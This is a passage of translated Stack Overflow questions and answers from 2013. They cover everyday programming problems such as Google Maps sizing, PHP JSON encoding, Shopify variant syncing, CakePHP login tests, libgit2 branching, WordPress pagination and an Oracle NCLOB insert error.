<script src="/assets/jquery_ujs.js?body=1" type="text/javascript"></script>
<script src="/assets/checkins.js?body=1" type="text/javascript"></script>
<script src="/assets/events.js?body=1" type="text/javascript"></script>
<script src="/assets/googlemaps.js?body=1" type="text/javascript"></script>
<script src="/assets/static_pages.js?body=1" type="text/javascript"></script>
<script src="/assets/users.js?body=1" type="text/javascript"></script>
<script src="/assets/application.js?body=1" type="text/javascript"></script>
  <meta content="authenticity_token" name="csrf-param" />
<meta content="SRh+VoCjXu3+LGmiH91+AByrXyNGEzv0nTXuZKbzfS8=" name="csrf-token" />
</head>
<body>

<h1>Create New Event:</h1>

<!-- Display map-->
<div id="event_map" style="width: 80%; height: 60%;"></div>

<form accept-charset="UTF-8" action="/events" class="new_event" id="new_event" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="SRh+VoCjXu3+LGmiH91+AByrXyNGEzv0nTXuZKbzfS8=" /></div>

... (details of form omitted)

</div>
  <div class="actions">
    <input name="commit" type="submit" value="Create Event" />
  </div>
</form>

<a href="/events">Back</a>

</body>
</html> 
```

这一切对我来说都是正确的。任何关于我做错了什么或静态页面和模型链接视图页面之间有什么不同的见解或建议都将受到欢迎。

**更新：** 所以看来 event_map div 必须有一个明确的样式。我将以下代码添加到 app/assets/stylesheets/events.css.scss：

```
#event_map { height: 300px; } 
```

这使它起作用。但是，有趣的是，我似乎无法将其更改为百分比符号。如果我做到 {height: 50%}，我又会得到一张空白地图。任何想法为什么会这样？我更喜欢生成一个灵活的布局，分配给地图的空间会自动调整为用户的浏览器窗口大小。

# visual-studio-2010 - VS2008 rdl vs. VS2010 rdl数据展示

> ID：15750120
> 
> 赞同：2
> 
> 时间：2013-04-01T19:17:25.960
> 
> 标签：visual-studio-2010, visual-studio-2008, reporting-services, ssrs-tablix

我有 VS2008，我有一个报告，该报告生成带有来自一个数据集的一个字段的 tablix。它正确显示值。它们是数字（0,00、10,00、15,00、25,00 - 使用表达式 =Fields!TaxRate.Value - 来自正确的数据集）。它们在 VS 2008 的 RDL 中正确显示（使用预览）。

当我复制 RDL 时，将其重命名为 RDLC 并在 VS 2010（Azure 模拟器）中打开它，在输出中它会在表中创建正确数量的字段 - 但它不会用数据填充它们，它们是空的。

所有其他字段 - 100 个或更多，来自 4 或 5 个数据集 - 正确显示。

以下是截图：

在报告中： ![在此处输入图像描述](https://i.stack.imgur.com/LkWrc.jpg)

在基地： ![在此处输入图像描述](https://i.stack.imgur.com/D7Y6B.jpg)

有人可以告诉我我在哪里犯错误吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:37:41.850

您没有在报告中指定“TaxID”。

# php - 带有一些 html 标记的 JSON 字符串在解析时失败

> ID：15750123
> 
> 赞同：1
> 
> 时间：2013-04-01T19:17:38.327
> 
> 标签：php, javascript, json, multilinestring

我正在使用 jQuery ajax 将用户输入发送到服务器...在数据库中插入用户值后，我将响应作为 JSON 字符串发送回客户端，如下所示

> echo '{"success":"true","data":"'.nl2br($a).'","type":"text"}';

由于用户输入可以包含换行符，我使用 nl2br 以便所有换行符都转换为 <br> 并且还知道 JSON 不支持多行，这就是我使用 nl2br 的原因 ....但是解析在客户端失败边

请告诉我是什么原因，我该如何解决？

解析代码`var obj = jQuery.parseJSON(data);`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:21:28.593

```
echo json_encode(array("success"=>"true","data"=>$a,"type"=>"text") 
```

使用 php 函数 json_encode 而不是尝试自己设置编码。这样你会省去很多麻烦。[http://php.net/manual/en/function.json-encode.php](http://php.net/manual/en/function.json-encode.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:22:37.290

[nl2br()](http://php.net/manual/en/function.nl2br.php)不替换换行符，只`<br>`在它们之前插入。

因此，`\n`正在返回并因此创建无效的 JSON。

您应该`json_encode()`在创建 JSON 字符串时使用。为简单起见，您可以简单地将其用于`data`：

```
echo '{"success":"true","data":' . json_encode(nl2br($a)) . ',"type":"text"}'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T20:06:21.083

您应该使用 json_encode，它将生成一个包含`\r\n`换行符的 JSON 字符串。然后你将不得不`\r\n`用`<br>`标签替换每个出现。

```
echo str_replace('\r\n','<br>', json_encode(array("success"=>"true","data"=>$a,"type"=>"text"))); 
```

# php - Facebook Open Graph 不返回字段

> ID：15750125
> 
> 赞同：1
> 
> 时间：2013-04-01T19:17:39.470
> 
> 标签：php, facebook-graph-api, facebook-php-sdk

我正在使用 PHP SDK 和 Javascript SDK 在我的网站上进行登录（效果很好）。

我的应用程序仅授权获取基本信息以及您在此屏幕中看到的电子邮件 ![在此处输入图像描述](https://i.stack.imgur.com/u2NxU.png)

但是，当我使用以下方法调用信息时：

```
 $user_profile = $facebook->api('/me','GET');
    //$user_profile[] needs name etc to insert into DB
    $fname = $user_profile['first_name'];
    $lname = $user_profile['last_name'];
    $email = $user_profile['email']; 
```

除了电子邮件，我什么都回来了....有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T16:45:52.257

必须更新我的参数中的范围。好像你在这两个地方都需要它。

```
 $params = array(
            'scope' => 'read_stream, friends_likes, email',
            'redirect_uri' => 'http://www.#######.com'
          ); 
```

# php - PHP Shopify 集成 - 变体删除

> ID：15750131
> 
> 赞同：1
> 
> 时间：2013-04-01T19:17:57.527
> 
> 标签：php, shopify

我正在开发一个集成到 shopify 的 PHP 应用程序。基本上产品信息必须在“商店”和应用程序之间同步。在产品内部，我们有变体（类似于子产品）。Shopify 曾经发送带有 json 数据的 webhook 来报告这些变化。每次我更改/添加/删除一个变体时，shopify 都会发送一个“产品更新”webhook，它只更改 json 内容。这是一个例子：

```
{
...
    "variants": [{
        "id": 279656846,
        "position": 1,
        "price": "80.00",
        "product_id": 123022448,
        "sku": "1000",
        "option1": "30 cm",
        "inventory_quantity": 10
    },
    {
        "id": 291321287,
        "position": 2,
        "price": "15.00",
        "product_id": 123022448,
        "sku": "1003",
        "option1": "15 cm",
        "inventory_quantity": 23
    }],
...
} 
```

如果我创建一个新变体，它会向我发送一个具有当前状态的“产品更新”，并在 json 中有新的变体。同样，如果我删除，它只会向我发送具有当前状态的“产品更新”，但没有 json 中已删除的变体。

我创建了以下代码，可以正确处理更改/添加案例：

```
foreach ($jsonArr['variants'] as $rows) {

    $variant = $rows['option1'];
    $sku = $rows['sku'];
    $salesPrice = $rows['price'];
    $stockQty = $rows['inventory_quantity'];

    $idVar = $rows['id'];

    $dupchk = mysql_query("SELECT * FROM `variants` WHERE `idVar`='$idVar'",$con) or die (mysql_error());
    $num_rows = mysql_num_rows($dupchk);

    if ($num_rows > 0) {

        $sql = "UPDATE `variants` SET `variant`='$variant',`sku`='$sku',`salesPrice`='$salesPrice',`stockQty`='$stockQty' WHERE `idVar`='$idVar'";

        if (!mysql_query($sql,$con)) {
            die('Error: ' . mysql_error());
        }

    }

    else {

        $sql = "INSERT INTO `variants`(`idVariant`, `idProduct`, `variant`, `sku`, `salesPrice`, `stockQty`, `comments`, `idVar`) VALUES ('','$idProduct','$variant','$sku','$salesPrice','$stockQty','','$idVar')";

        if (!mysql_query($sql,$con)) {
            die('Error: ' . mysql_error());
        }

    }

} 
```

问题是这段代码不处理删除变体的情况。我试图这样做，但直到现在只创建一个无法工作的“大混乱”代码。请告知您是否对明智的处理方式有任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T22:39:03.013

为了解决我使用了以下代码：

```
//Variable to count variant update or create
$var_count = 0;

foreach ($jsonArr['variants'] as $rows) {

    $variant = $rows['option1'];
    $sku = $rows['sku'];
    $salesPrice = $rows['price'];
    $stockQty = $rows['inventory_quantity'];

    $idVar = $rows['id'];

    $dupchk = mysql_query("SELECT * FROM `variants` WHERE `idVar`='$idVar'",$con) or die (mysql_error());
    $num_rows = mysql_num_rows($dupchk);

    if ($num_rows > 0) {

        $sql = "UPDATE `variants` SET `variant`='$variant',`sku`='$sku',`salesPrice`='$salesPrice',`stockQty`='$stockQty' WHERE `idVar`='$idVar'";
        $var_count++;

        if (!mysql_query($sql,$con)) {
            die('Error: ' . mysql_error());
        }

    }

    else {

        $sql = "INSERT INTO `variants`(`idVariant`, `idProduct`, `variant`, `sku`, `salesPrice`, `stockQty`, `comments`, `idVar`) VALUES ('','$idProduct','$variant','$sku','$salesPrice','$stockQty','','$idVar')";
        $var_count++;

        if (!mysql_query($sql,$con)) {
            die('Error: ' . mysql_error());
        }

    }

}

//Start checking to erase variant if needed
$result = mysql_query("SELECT `idVar` FROM products NATURAL JOIN variants WHERE `idShopify`='$idShopify'",$con);
$num_rows = mysql_num_rows($result);

if ($num_rows>$var_count) {

    while($row = mysql_fetch_array($result))
        {

            $clear = 0;

            foreach ($jsonArr['variants'] as $rows) {

                if ($rows['id']==$row['idVar']) {
                    $clear++;
                }

            }

            if ($clear==0) {

                $idVar = $row['idVar'];
                $sql = "DELETE FROM `variants` WHERE `idVar`='$idVar'";

                if (!mysql_query($sql,$con)) {
                    die('Error: ' . mysql_error());
                }

            }

        }

} 
```

这并不优雅但有效。随意建议代码改进。

# unix - 在 Unix 中将命令附加到文件

> ID：15750132
> 
> 赞同：0
> 
> 时间：2013-04-01T19:17:59.730
> 
> 标签：unix, ssh

我们如何将命令附加到文件的第一行？例如显示日期的命令？提前感谢您的回答

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:22:03.367

在不覆盖文件的情况下，不可能直接添加到文件中。

这可能对您有用。

```
mv file1.txt file1.txt.tmp       # Move file temporarily
date > file1.txt                 # Add your command
cat file1.txt.tmp >> file1.txt   # Append original content
rm file1.txt.tmp                 # Remove temporary file 
```

# php - CakePHP 2.3 - 单元测试用户登录

> ID：15750135
> 
> 赞同：5
> 
> 时间：2013-04-01T19:18:11.893
> 
> 标签：php, unit-testing, cakephp, phpunit, cakephp-2.3

我想我必须在这里向我的问题寻求一些帮助。我已经花了整个晚上的时间。我有一个这样的登录方法`UsersController`：

```
public function login() {

        if ( $this->request->is( 'post' ) ) {
            if ( $this->Auth->login() ) {
                $this->redirect( array( 'controller' => 'reservations', 'action' => 'index' ) );
            } else {
                $this->Session->setFlash( __( 'Login error.' ), 'flashError' );
            }
        }
    } 
```

我尝试使用**PHPUnit**对此进行测试，因此我可以确定只有有效用户才能登录 → 成功登录后，他们将被重定向到特定页面。这是我`testLogin`在`UsersControllerTest`课堂上的方法：

```
function testLogin() {

        $UsersController = $this->generate( 'Users', array(
                'components' => array(
                    'Auth' => array( 'user' )
                ),
            )
        );

        $UsersController->Auth->expects( $this->any() )
        ->method( 'user' )
        ->with( 'id' )
        ->will( $this->returnValue( 2 ) );

        $data = array( 'User' => array(
                'student_number' => 1111111,
                'password' => 'qwerty'
            ) );

        //$UsersController->Auth->login( $data['User'] );

        $this->testAction( '/users/login', array( 'data' => $data, 'method' => 'get' ) );
        $url = parse_url( $this->headers['Location'] );
        $this->assertEquals( $url['path'], '/reservations' );
    } 
```

我仍在学习使用 CakePHP 进行单元测试的基础知识。我收到此错误：

```
PHPUNIT_FRAMEWORK_ERROR_NOTICE
Undefined index: Location
Test case: UsersControllerTest(testLogin) 
```

我不知道是什么原因造成的......我的测试方法有什么问题以及应该如何编写？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T05:03:58.257

我使用以下代码进行了此操作：

```
function testLogin() {

        //mock user
        $this->Users = $this->generate( 'Users', array(
                'components' => array(
                    'Security' => array( '_validatePost' ),
                )
            ) );

        //create user data array with valid info
        $data = array();
        $data['User']['student_number'] = 1234567;
        $data['User']['password'] = '[valid password here]';

        //test login action
        $result = $this->testAction( "/users/login", array(
                "method" => "post",
                "return" => "contents",
                "data" => $data
            )
        );

        $foo[] = $this->view;
        //debug($foo);

        //test successful login
        $this->assertNotNull( $this->headers['Location'] );
        $this->assertContains( 'reservations', $this->headers['Location'] );
        $this->assertNotContains( '"/users/login" id="UserLoginForm"', $foo );

        //logout mocked user
        $this->Users->Auth->logout();
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-24T11:06:41.937

我使用这个测试用例来覆盖 cake`Auth`调用`Session`并检查登录是否成功。

这更像是我在测试中使用的通用解决方案。用于在用户登录后将值放入会话中，并检查登录是否成功。

```
<?php
App::uses('UsersController', 'Controller');
App::uses('AuthComponent', 'Controller/Component');
App::uses('CakeRequest', 'Network');
App::uses('CakeResponse', 'Network');

$_SERVER['HTTP_USER_AGENT'] = '';

class stubSession {
  public $data = array();

  public function write($key, $value){
    $this->data[$key] = $value;
  }

  public function read($key){
    if(array_key_exists($key, $this->data)){
      return $this->data[$key];
    } 
  }

  public function renew() {

  }

  public function setFlash(){

  }

  public function delete() {

  }

  public function check(){

  }
}

class stubRequest {
  public $data = array();

  function __construct($data) {
    $this->data = $data;
  }

  public function is() {
    return true;
  }

  public function clientIp(){

  }
}

class stubAuthComponent extends AuthComponent{

  public static $_session;

  public function __construct($args, $session){
    parent::__construct($args);
    $this->Session = $session;
    self::$_session = $session; 
    $this->request = new CakeRequest();
    $this->response = new CakeResponse();
  }

  public function loggedIn() {
    return self::$_session->read(self::$sessionKey) != array();
  }

  public function logout(){

  }

  public static function user($key) {
    $user = self::$_session->read(self::$sessionKey);
    return $user[$key];
  }
}

class UsersControllerTest extends UsersController {  

  function __construct($data){
    $this->User = ClassRegistry::init('User');
    $this->Session = new stubSession();
    $this->Auth = new stubAuthComponent(new ComponentCollection(), $this->Session); 
    $this->request = new stubRequest($data);
  }

  public function redirect(){

  }
}

class TestUsersController extends CakeTestCase {

  public function testLogin(){
    $_POST = array('User' => array('email' => 'mail@someemail.com', 'username' => 'mail@someemail.com', 'password' => 'abcd1234'));
    $usersController = new UsersControllerTest($_POST);
    $usersController->login();
    $login = $usersController->Auth->loggedIn();
    //debug($usersController->Session->data); //you can test the session key value in here
    $this->assertEquals($login, true);
  }
} 
```

# face-detection - 是否可以将 Microsoft 面部跟踪 SDK 与本地图像一起使用

> ID：15750137
> 
> 赞同：2
> 
> 时间：2013-04-01T19:18:13.507
> 
> 标签：face-detection, kinect-sdk

我想知道是否有可能获得 Kinect 人脸跟踪 SDK 给出的 121 人脸坐标，但来自本地图像。我的意思是，我在硬盘上有一些本地图像，我想提取这些点。这可能吗，或者面部跟踪算法仅适用于 Kinect 相机提供的数据？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T21:03:18.173

Microsoft Kinect FraceTracking 示例中使用的算法使用直接来自 Kinect 传感器的多个数据点——深度数据是您缺少的主要数据点。因此，不可能简单地将图像插入算法以从平面图像中获取数据点。

网络上有多个示例可以从平面图像和标准视频中提取面部特征（即不包括深度数据）。一些标准的图像处理库（例如，OpenCV）甚至可能已经包含它们（尽管我无法确认）。

# java - 错误：运行 map reduce 作业时出现 org/jdom/JDOMException

> ID：15750143
> 
> 赞同：0
> 
> 时间：2013-04-01T19:18:32.427
> 
> 标签：java, hadoop, xml-parsing, mapreduce, jdom

您好我正在尝试使用 map reduce 框架解析 XML 文件。我正在使用 JDOM Parser 来解析 XML 文件。但是当我在伪节点集群上运行我的 map reduce 代码时，它会给我以下错误。

```
WARN mapred.JobClient: Use GenericOptionsParser for parsing the arguments. Applications  
                       should implement Tool for the same.
INFO input.FileInputFormat: Total input paths to process : 1
INFO util.NativeCodeLoader: Loaded the native-hadoop library
WARN snappy.LoadSnappy: Snappy native library not loaded
INFO mapred.JobClient: Running job: job_201303281220_0016
INFO mapred.JobClient: map 0% reduce 0%
INFO mapred.JobClient: Task Id : attempt_201303281220_0016_m_000000_0, Status : FAILED
Error: org/jdom/JDOMException
INFO mapred.JobClient: Task Id : attempt_201303281220_0016_m_000000_1, Status : FAILED
Error: org/jdom/JDOMException
INFO mapred.JobClient: Task Id : attempt_201303281220_0016_m_000000_2, Status : FAILED
Error: org/jdom/JDOMException
INFO mapred.JobClient: Job complete: job_201303281220_0016
INFO mapred.JobClient: Counters: 7
INFO mapred.JobClient: Job Counters
INFO mapred.JobClient: SLOTS_MILLIS_MAPS=7541
INFO mapred.JobClient: Total time spent by all reduces waiting after reserving slots  
                       (ms)=0
INFO mapred.JobClient: Total time spent by all maps waiting after reserving slots 
                       (ms)=0
INFO mapred.JobClient: Launched map tasks=4
INFO mapred.JobClient: Data-local map tasks=4
INFO mapred.JobClient: SLOTS_MILLIS_REDUCES=0
INFO mapred.JobClient: Failed map tasks=1 
```

我尝试下载 JDOM 1.x jar，但仍然没有帮助得到同样的错误。如果有人可以提出一些建议，那将是一个很大的帮助。

注意：我可以运行各种示例，例如 word-count、PI，所以我认为我的集群建立正确。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:59:27.283

您需要确认并确保您的输入文件每行有一个 XML 文档（例如，您的 XML 中没有换行符）？很可能 map() 方法是单行处理的（您正在使用 FileInputFormat），但嵌入的换行符这些行仅包含部分 XML 文档。

例如，如果您的文件如下所示：

```
<root
    arg1=""
    arg2="">

</root> 
```

然后将为五行中的每一行调用一次 map() 方法。没有一行包含有效的 XML 文档。即使您的文件确实包含有效的 XML，DOM 解析错误也会被抛出 5 次

# c# - 在 C# 中序列化对象并获取字节流

> ID：15750154
> 
> 赞同：7
> 
> 时间：2013-04-01T19:19:05.600
> 
> 标签：c#, .net, serialization, deserialization

我有一个对象，一个`Serializable`类的实例。我想知道如何将这个对象作为字节流获取？

我知道我可以使用[`BinaryFormatter`](http://msdn.microsoft.com/en-us/library/c5sbs8z9.aspx)然后使用该`Serialize`方法，但是该方法需要一个`serializationStream`写入序列化对象的位置。我希望能够将它写入特定位置的文件/流中，所以我想做类似的事情：

```
obj = new Something(); // obj is serializable 
byte[] serialized = obj.serialize(); [*]
file.write(position, serialized) 
```

有什么办法可以做`[*]`, 来获取对象序列化的字节？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-01T19:23:48.667

```
MemoryStream m = new MemoryStream();
var formatter = new BinaryFormatter();
formatter.Serialize(m, new MyClass() {Name="SO"});
byte[] buf = m.ToArray(); //or File.WriteAllBytes(filename, m.ToArray())

[Serializable]
public class MyClass
{
    public string Name;
} 
```

# branch - 如何使用 libgit2 创建分支

> ID：15750160
> 
> 赞同：3
> 
> 时间：2013-04-01T19:19:28.697
> 
> 标签：branch, libgit2

如何使用 libgit2 库创建分支，API 引用了提交目标，但是我应该为这个参数使用什么？

这是我到目前为止得到的代码，基于测试中的示例代码，但它们使用了许多硬编码引用，因此很难发现你应该在现实世界场景中使用什么，比如我应该在这个“目标”中传递什么实例。

```
git_reference *branch = NULL, *head = NULL;

/* Create the branch */
git_branch_create( &branch, open_repo, "MyNewBranch", target, 0 );

/* Make HEAD point to this branch */
git_reference_symbolic_create( &head, open_repo, "HEAD", git_reference_name( branch ), 1 );
git_reference_free( head );
git_reference_free( branch ); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:35:27.643

> 在这种情况下，我应该作为“目标”传递什么。

您希望新分支指向的已解决提交。

如**[标题中所述](https://github.com/libgit2/libgit2/blob/development/include/git2/branch.h)**

> @param target**此分支应指向的对象。**该对象必须属于给定的`repo`，可以是 git_commit 或 git_tag。当传递 git_tag 时，它应该可以取消引用到 git_commit，其中 oid 将用作分支的目标。

**注意：**令人惊讶的是，标题与代码不同步。标题使读者认为传递 a`git_object`就可以了。但是，只`git_commit`接受 a。

## 更新

> 我将如何获得“已解决的提交”；

*   如果您知道提交的 oid，那`git_commit_lookup()`将是可行的方法。
*   如果您已经持有一个`git_object`恰好是提交（`git_object_type()`返回`GIT_OBJ_COMMIT`）的 a ，您可以将其强制转换并传递`(git_commit *)my_object`给函数。

# jquery - CSS - 多个分段控件失败

> ID：15750161
> 
> 赞同：0
> 
> 时间：2013-04-01T19:19:30.037
> 
> 标签：jquery, html, css

所以我在[http://www.prcvl.com/demos/segmented-controls](http://www.prcvl.com/demos/segmented-controls)找到了一个很好的分段控制，我现在正试图适应我的需要。

问题是当我向页面添加多个控件时，单击按钮只会影响第一个分段控件。除了必须多次重新创建 css/命名之外，有没有人知道另一种方法来实现这一点？也许通过利用jquery？

这是确切代码的小提琴：http: [//jsfiddle.net/kyV5U/](http://jsfiddle.net/kyV5U/)

例子：

```
<ul class="segmented-control">
    <li id="any"><a href="#any">Any</a></li>
    <li id="all"><a href="#all">All</a></li>
</ul>
<div style="clear:both;"></div>

<ul class="segmented-control">
    <li id="any"><a href="#any">Any 2</a></li>
    <li id="all"><a href="#all">All 2</a></li>
</ul>
<div style="clear:both;"></div> 
```

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:28:09.237

您必须更改后续控件的 id 和锚标记。

```
<body>
 <ul class="segmented-control">
    <li id="any"><a href="#any">Any</a></li>
    <li id="all"><a href="#all">All</a></li>
 </ul>
 <div style="clear:both;"></div>

 <ul class="segmented-control">
    <li id="any2"><a href="#any2">Any 2</a></li>
    <li id="all2"><a href="#all2">All 2</a></li>
 </ul>

 <div style="clear:both;"></div>
 <ul class="segmented-control">
    <li id="any3"><a href="#any3">Any 3</a></li>
    <li id="all3"><a href="#all3">All 3</a></li>
 </ul>
</body> 
```

# wordpress - 尝试为特定类别实现分页（ WORDPRESS ）

> ID：15750162
> 
> 赞同：0
> 
> 时间：2013-04-01T19:19:37.590
> 
> 标签：wordpress, wordpress-theming

我为唱片实现了自定义帖子类型。我设法编辑了模板的循环，因此它显示了所有具有“跟踪”类型的帖子，但现在分页不再工作了。

这是循环中的代码：

```
<?php
$args = array( 'post_type' => 'Track', 'posts_per_page' => 5);
     $loop = new WP_Query( $args );

while ( $loop->have_posts() ) : $loop->the_post();
?>

//HERE COMES MY HTML STUFF

<?php    endwhile;?>
<?php fuse_pagenavi(); ?> 
```

这是我的 fuse_pagenavi() 的代码：

```
<?php
function fuse_pagenavi($pages = '', $range = 4)
{
     $showitems = ($range * 2)+1;
     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }  

     if(1 != $pages)
     {
         echo "<div class=\"pagination\"><span class=\"pageof\">Page ".$paged." of ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";

         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }

         if ($paged < $pages && $showitems < $pages) echo "<a class=\"pageof\" href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a class=\"pageof\" href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
         echo "</div>\n";
     }
}
?> 
```

先感谢您 ！

更新 ：

好的，我想我取得了一些进展。我安装了 wp-pagenavi 插件，现在我在页面底部看到了分页链接，但它们指向 mysite.com/?paged=x 而不是指向 mysite.com/?page=x .... 我测试过手动使用“页面”，它可以工作......

代码如下：

```
<?php
$paged = get_query_var('page');
$my_query = new WP_Query($args);

$args = array( 'post_type' => 'Track', 'posts_per_page' => 5,'paged' => $paged);
         $loop = new WP_Query( $args );
while ( $loop->have_posts() ) : $loop->the_post();
?>

//HTML STUFF

<?php 
wp_pagenavi(array('query' => $loop));
wp_reset_postdata();
 ?> 
```

如何使我的分页链接指向 mysite.com?page=x 而不是 paged=x。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T09:53:54.513

尝试这个：

```
<?php
if ( get_query_var('paged') ) { $paged = get_query_var('paged'); }
elseif ( get_query_var('page') ) { $paged = get_query_var('page'); }
else { $paged = 1; }
$args = array( 'post_type' => 'Track', 'posts_per_page' => 5, 'paged' => $paged);
  $loop = new WP_Query( $args );

while ( $loop->have_posts() ) : $loop->the_post();
?>

//HERE COMES MY HTML STUFF

<?php    endwhile;?>
<?php fuse_pagenavi(); ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T03:39:50.053

您是否在循环内使用循环。如果是这样，我认为：[https](https://wordpress.stackexchange.com/questions/89191/using-query-posts-inside-single-php-loop) : //wordpress.stackexchange.com/questions/89191/using-query-posts-inside-single-php-loop 对您有用。

祝你好运

# c# - 在数据表中呈现 HTML

> ID：15750163
> 
> 赞同：2
> 
> 时间：2013-04-01T19:19:45.470
> 
> 标签：c#, asp.net-mvc

我有一个要渲染到网页的数据表。我想在每一行上显示一个复选框。但是，当我尝试显示它时，它会显示 html。有没有办法解决？

类定义：

```
 public int analysisId { get; set; }
    public string heatName { get; set; }
    public DateTime analysisTime { get; set; }
    public string sampleType { get; set; }
    public string grade { get; set; }
    public string productId { get; set; }
    public string element { get; set; }
    public float value { get; set; } 
```

我的模型中的代码如下：

```
 DataTable GridData = new DataTable();
        GridData.Columns.Add("CheckBoxes");
        GridData.Columns.Add("Analysis ID");
        GridData.Columns.Add("Analysis Time");
        GridData.Columns.Add("Sample Type");
        GridData.Columns.Add("Product ID");

        foreach (var item in elementheaders)
        {
            GridData.Columns.Add(item.Trim());
        }

        int gridend = GridData.Columns.Count;
        int gridrow = 0;//x
        int listrow = 0;//z
        int checknum = 0;

foreach (int analysis in ChemList.Select(d => d.analysisId).Distinct())
{
    DataRow dr = GridData.NewRow();
    GridData.Rows.Add(dr);
    GridData.Rows[gridrow][0] = System.Web.HttpUtility.HtmlDecode("<input type='checkbox' id="+checknum+">");
    GridData.Rows[gridrow][1] = ChemList[listrow].analysisId;
    GridData.Rows[gridrow][2] = ChemList[listrow].analysisTime;
    GridData.Rows[gridrow][3] = ChemList[listrow].sampleType;
    GridData.Rows[gridrow][4] = ChemList[listrow].productId;
} 
```

在我看来：

```
<div id="grid">
    <table id="example"  class ="gridTable">
        <thead class="gridHead">
            <tr>
                @Html.DisplayFor(x => x.Columns)
            </tr>
        </thead>
        <tbody>
                @Html.DisplayFor(x => x.Rows)
        </tbody>
    </table>
</div> 
```

单元格的显示模板：

```
@model TheManhattanProject.Models.CellValueViewModel

<td>
    @Html.DisplayFor(x => x.Value)
</td> 
```

行的显示模板：

```
@model TheManhattanProject.Models.RowViewModel

<tr>
    @Html.DisplayFor(x => x.Values)
</tr> 
```

列的显示模板：

```
@model TheManhattanProject.Models.ColumnViewModel

<th>
    @Html.DisplayFor(x => x.Name)
</th> 
```

我有两个用于渲染的视图模型。每个单元格和行一个。该行由一个单元格值列表组成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:00:47.197

默认情况下，HTML 助手将对任何字符串进行 HTML 编码。这是一项安全和安保功能。这是一个可以帮助您的答案 - [编写/输出未转义的 HTML 字符串](https://stackoverflow.com/questions/4281424/asp-net-mvc-razor-output-html-string-non-escaped)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:31:06.380

您可以为不进行 html 编码的校验码使用自定义显示模板。

您的 ViewModel 将使用：

```
GridData.Rows[gridrow][0] = checknum; 
```

显示模板将使用

```
<%@ Control Language="C#" Inherits="System.Web.Mvc.ViewUserControl<Int>" %>

<input type="checkbox" id="@Model" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T00:14:06.083

想出了答案。这是马修试图告诉我的延伸。

```
@using System;
@model TheManhattanProject.Models.CellValueViewModel
<td>
@{if(Model.Value.StartsWith("<input type='checkbox'"))
{

    @Html.Raw(Model.Value);

}
else
{

    @Html.DisplayFor(x => x.Value);

}
}
</td> 
```

# string - 实体框架和 Oracle：无法插入 VARCHAR2 > 1,999 个字符

> ID：15750172
> 
> 赞同：4
> 
> 时间：2013-04-01T19:20:14.843
> 
> 标签：string, oracle, entity-framework, ora-00932, varchar2

我在 Oracle 表中创建了一个 4,000 个字符的 VARCHAR2 字段。我正在使用 LINQ to Entities with Visual Studio 2010、.NET Framework 4 和[ODAC 11.2 Release 4 和 Oracle Developer Tools for Visual Studio (11.2.0.3.0)](http://www.oracle.com/technetwork/topics/dotnet/utilsoft-086879.html)将字符串值插入到字段中。当我尝试插入大于 1,999 个字符的字符串值时，我得到以下内部异常：

> Oracle.DataAccess.Client.OracleException
> 
> ORA-00932: 不一致的数据类型: 预期 - 得到 NCLOB

但是，使用 SQL Developer 时，我可以在字段中插入一个 4,000 个字符的字符串值，而不会出现任何问题。

有一个[已知的 ODAC 错误](https://forums.oracle.com/forums/thread.jspa?messageID=10193157)（[源 #2](https://stackoverflow.com/questions/10912650/ora-00932-inconsistent-datatypes-expected-number-got-nclob-error-when-trying)），其中保存到 XMLTYPE 字段时有 2,000 个字符的限制，但我没有保存到 XMLTYPE 字段。我的 GAC 中有 Oracle.DataAccess 2.112.3.0，我考虑更新到上述 Oracle 软件的第 5 版 (11.2.0.3.20)，但“Oracle Developer Tools for Visual Studio”似乎是唯一的组件从第 4 版更新，我相信“Oracle Data Provider for .NET 4”是需要更新的组件。在我的 .NET 项目中，System.Data.Entity 和 System.Data.OracleClient 都是运行时版本 4.0.30319。

无论如何，我只是想知道是否有其他人遇到过这个错误，如果是这样，是否找到了任何解决方案——除了上面链接的 Oracle 论坛线程中建议使用存储过程作为解决方法的解决方案。Google 告诉我，人们仅在使用 XMLTYPE 字段时才会遇到此错误，但我不能是唯一在使用 VARCHAR2 字段时遇到此错误的人，可以吗？

